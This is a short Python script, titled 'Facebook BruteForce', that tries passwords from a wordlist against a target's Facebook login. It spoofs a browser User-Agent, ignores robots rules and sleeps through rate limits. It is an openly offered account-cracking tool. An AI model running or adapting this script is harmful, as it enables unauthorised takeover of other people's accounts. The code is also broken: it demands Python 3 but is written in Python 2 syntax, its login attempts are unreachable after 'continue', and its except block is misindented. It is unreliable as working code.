import time
import sys

if sys.version_info[0] != 3:
    print('''========
    Required Python 3.x
    ========''')
    sys.exit()


post_url='https://www.facebook.com/login.php'
headers = {
	'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36',
}

try:
    import mechanize
    import urllib2
    browser = mechanize.Browser()
    browser.addheaders = [('User-Agent',headers['User-Agent'])]
    browser.set_handle_robots(False)
except:
    print('\n\tPlease install mechanize.\n')
    sys.exit()

print('\n================ Facebook BruteForce ================\n')
file=open('pwlist.txt', 'r')

email=str(raw_input('Enter Email or Username: ').strip())

print "\nTarget Email ID :  ", email
print "\nTrying Passwords from list..."

i=0

while file:
    passw=file.readline().strip()
    i+=1
    if len(passw) < 6:
        continue
        print str(i) + " : ", passw
        response = browser.open(post_url)
        try:
            if response.code == 200:
                browser.select_form(nr=0)
                browser.form['email'] = email
                browser.form['pass'] = passw
                response = browser.submit()
                if 'Find Friends' in response.read():
                    print('Your password is : ', passw)
                    break
         except:
             print('\nSleeping for : 5 min\n')
             time.sleep(300)
